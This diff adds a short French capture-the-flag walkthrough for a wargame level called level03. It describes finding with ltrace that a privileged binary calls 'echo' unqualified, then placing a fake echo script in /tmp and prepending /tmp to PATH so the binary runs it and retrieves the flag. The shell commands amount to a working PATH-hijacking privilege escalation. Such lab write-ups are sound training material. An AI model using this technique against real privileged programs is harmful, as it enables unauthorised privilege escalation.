@@ -1,0 +1,10 @@
+On va utiliser ltrace pour voir que le binaire level03 utilise echo pour afficher exploit me
+l objectif ici est de remplacer le echo de la machine par notre echo qui lancera getflag
+on va copier le script.sh sur la vm, puis le rendre executable et enfin modifier le path
+pour que le premier echo appele soit le notre
+scp -P 9999 ./script.sh level03@localhost:/tmp/script.sh
+chmod +x /tmp/script.sh
+on oublie pas de renommer le script en echo :
+mv /tmp/script.sh /tmp/echo
+export PATH="/tmp:$PATH"
+on relance le binaire et le flag sera stocke dans /tmp/flag
